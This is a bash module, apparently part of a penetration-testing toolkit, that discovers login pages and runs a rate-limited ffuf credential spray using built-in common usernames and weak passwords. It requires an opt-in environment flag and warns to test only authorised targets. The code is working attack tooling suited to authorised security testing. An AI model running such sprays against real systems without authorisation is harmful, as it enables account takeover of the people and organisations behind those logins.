#!/usr/bin/env bash
# bruteforce.sh — Discover login forms, then run a low-and-slow credential
# spray against them using ffuf cluster-bomb. Authorisation requirement:
# this module is gated behind the `deep` profile AND the BRUTE_FORCE_OK=1
# env var, so it never runs by accident.
#
# Pipeline:
#   1. Walk live_hosts + endpoints.txt for paths that look like login pages
#      (/login, /signin, /admin, /wp-login.php, /portal, /auth, ...).
#   2. For each candidate, fetch the page and detect the form fields
#      (username / password input names) via a regex over the HTML.
#   3. Build a small, sane username + password list (env-overridable).
#   4. Run ffuf cluster-bomb POST against the form with the two wordlists,
#      filtering out the baseline failed-login response.
#   5. Any response whose size / status differs from the baseline is logged
#      as a candidate (NOT a confirmed login — the operator must verify).

[[ -n "${_FIK_BRUTEFORCE_SOURCED:-}" ]] && return 0
_FIK_BRUTEFORCE_SOURCED=1

run_bruteforce_scan() {
  [[ -z "${OUTPUT_DIR:-}" ]] && { log_error "OUTPUT_DIR not set"; return 1; }

  if [[ "${SCAN_PROFILE:-standard}" != "deep" ]]; then
    log_info "bruteforce only runs in 'deep' profile; skipping."
    return 0
  fi
  if [[ "${BRUTE_FORCE_OK:-0}" != "1" ]]; then
    log_warn "BRUTE_FORCE_OK is not set to 1 — refusing to run credential spray."
    log_warn "Set BRUTE_FORCE_OK=1 (only against targets you are authorised to test) to enable."
    return 0
  fi
  if ! command -v ffuf >/dev/null 2>&1; then
    log_warn "ffuf not installed; bruteforce module disabled."
    return 0
  fi
  if ! command -v curl >/dev/null 2>&1; then
    log_warn "curl not installed; bruteforce module disabled."
    return 0
  fi

  local live="${OUTPUT_DIR}/live_hosts.txt"
  [[ -s "${live}" ]] || { log_warn "No live hosts; bruteforce skipped."; return 0; }

  local out_dir="${OUTPUT_DIR}/bruteforce"
  mkdir -p "${out_dir}"

  local candidates="${out_dir}/login_candidates.txt"
  : > "${candidates}"
  _discover_login_pages > "${candidates}"
  local cand_n; cand_n="$(wc -l < "${candidates}" | tr -d ' ')"
  log_step "Bruteforce (cluster-bomb) on ${cand_n} login candidates"
  if (( cand_n == 0 )); then
    log_warn "No login pages found; bruteforce done."
    return 0
  fi

  local users="${out_dir}/users.txt"
  local passes="${out_dir}/passwords.txt"
  _build_user_wordlist > "${users}"
  _build_password_wordlist > "${passes}"
  local n_users n_pass
  n_users="$(wc -l < "${users}" | tr -d ' ')"
  n_pass="$(wc -l < "${passes}" | tr -d ' ')"
  log_info "Wordlists: ${n_users} usernames \u00d7 ${n_pass} passwords = $((n_users * n_pass)) attempts/host"

  local hits="${out_dir}/bruteforce_hits.txt"
  : > "${hits}"

  local url
  while IFS= read -r url; do
    [[ -z "${url}" ]] && continue
    _spray_one_login "${url}" "${users}" "${passes}" "${out_dir}" "${hits}" || true
  done < "${candidates}"

  local n; n="$(wc -l < "${hits}" | tr -d ' ')"
  log_success "Bruteforce candidate logins: ${n} (review ${hits} manually before claiming)"
}

# ---------------------------------------------------------------------------
# _discover_login_pages — heuristic search for plausible login URLs.
# ---------------------------------------------------------------------------
_discover_login_pages() {
  local endpoints="${OUTPUT_DIR}/endpoints.txt"
  local live="${OUTPUT_DIR}/live_hosts.txt"
  local re='/(login|signin|sign-in|log-in|admin|administrator|wp-login\.php|portal|account/login|users/sign_in|auth|sso|console|cpanel|webmail|owa|adfs)([/?#]|$)'

  {
    [[ -s "${endpoints}" ]] && grep -Ei "${re}" "${endpoints}" 2>/dev/null
    # Always probe a few canonical paths on every live host even if the
    # crawler didn't surface them.
    local host
    while IFS= read -r host; do
      [[ -z "${host}" ]] && continue
      for p in login signin admin wp-login.php administrator portal auth user/login users/sign_in account/login; do
        printf '%s/%s\n' "${host%/}" "${p}"
      done
    done < "${live}"
  } | sort -u
}

# ---------------------------------------------------------------------------
# _spray_one_login <url> <users> <passes> <out_dir> <hits>
# Detect form fields, get a baseline 401/200 failure response, then ffuf
# cluster-bomb and write anything that deviates from the baseline.
# ---------------------------------------------------------------------------
_spray_one_login() {
  local url="$1" users="$2" passes="$3" out_dir="$4" hits="$5"

  local html
  html="$(curl -sk --max-time 10 -L "${url}" 2>/dev/null || true)"
  [[ -z "${html}" ]] && return 0

  # Extract username + password input field names.
  local user_field pass_field
  user_field="$(echo "${html}" | grep -Eoi 'name=("|'"'"')(user(name)?|email|login|uid|userid)("|'"'"')' | head -1 | sed -E 's/.*name=("|'"'"')([^"'"'"']+)("|'"'"').*/\2/')"
  pass_field="$(echo "${html}" | grep -Eoi 'name=("|'"'"')(pass(word|wd)?|pwd)("|'"'"')'              | head -1 | sed -E 's/.*name=("|'"'"')([^"'"'"']+)("|'"'"').*/\2/')"
  [[ -z "${user_field}" ]] && user_field="username"
  [[ -z "${pass_field}" ]] && pass_field="password"

  # Detect form action / method; default to POSTing the same URL.
  local form_action method
  form_action="$(echo "${html}" | grep -Eoi 'action=("|'"'"')[^"'"'"']+("|'"'"')' | head -1 | sed -E 's/action=("|'"'"')([^"'"'"']+)("|'"'"')/\2/')"
  method="POST"

  local target="${url}"
  if [[ -n "${form_action}" ]]; then
    case "${form_action}" in
      http*://*) target="${form_action}" ;;
      /*)        local host="${url%%/*}//${url#*//}"; host="${host%%/*}"; target="${host}${form_action}" ;;
      *)         target="${url%/}/${form_action}" ;;
    esac
  fi

  # Baseline failed login — must NOT be a real cred (use a clearly-invalid one).
  local baseline_size baseline_status
  local baseline
  baseline="$(curl -sk --max-time 10 -L -o /dev/null -w '%{http_code} %{size_download}' \
    -X POST -d "${user_field}=__fik_baseline__&${pass_field}=__fik_baseline__" \
    "${target}" 2>/dev/null || true)"
  baseline_status="${baseline%% *}"
  baseline_size="${baseline##* }"
  [[ -z "${baseline_status}" ]] && baseline_status=0
  [[ -z "${baseline_size}"   ]] && baseline_size=0

  local safe; safe="$(echo "${target}" | sed 's|[^A-Za-z0-9._-]|_|g')"
  local jout="${out_dir}/${safe}.json"

  local rl="${BRUTE_FORCE_RATE:-5}"
  local th="${BRUTE_FORCE_THREADS:-2}"

  log_info "Spraying ${target} (field=${user_field}/${pass_field}, baseline=${baseline_status}/${baseline_size}, rl=${rl})"
  ffuf -u "${target}" \
       -X POST \
       -d "${user_field}=USER&${pass_field}=PASS" \
       -w "${users}:USER" -w "${passes}:PASS" \
       -mode clusterbomb \
       -mc all -ac \
       -fs "${baseline_size}" \
       -t "${th}" -rate "${rl}" \
       -timeout 10 \
       -of json -o "${jout}" \
       -s 2>/dev/null || true

  if [[ -s "${jout}" ]] && command -v jq >/dev/null 2>&1; then
    jq -r --arg t "${target}" --arg u "${user_field}" --arg p "${pass_field}" \
      '.results[]? | "\($t)\t\(.status)\t\(.length)\t\($u)=\(.input.USER)\t\($p)=\(.input.PASS)"' \
      "${jout}" 2>/dev/null >> "${hits}" || true
  fi
}

_build_user_wordlist() {
  if [[ -n "${BRUTE_FORCE_USERS_FILE:-}" && -s "${BRUTE_FORCE_USERS_FILE}" ]]; then
    cat "${BRUTE_FORCE_USERS_FILE}"
    return
  fi
  cat <<'EOF'
admin
administrator
root
user
test
guest
support
sysadmin
operator
manager
backup
demo
api
service
postgres
mysql
oracle
EOF
}

_build_password_wordlist() {
  if [[ -n "${BRUTE_FORCE_PASS_FILE:-}" && -s "${BRUTE_FORCE_PASS_FILE}" ]]; then
    cat "${BRUTE_FORCE_PASS_FILE}"
    return
  fi
  cat <<'EOF'
admin
admin123
administrator
password
password123
Password1
Password@123
P@ssw0rd
123456
12345678
qwerty
welcome
welcome123
changeme
letmein
root
toor
test
test123
demo
guest
support
default
123abc
abc123
companyname123
Summer2024!
Spring2025!
Winter2024!
EOF
}
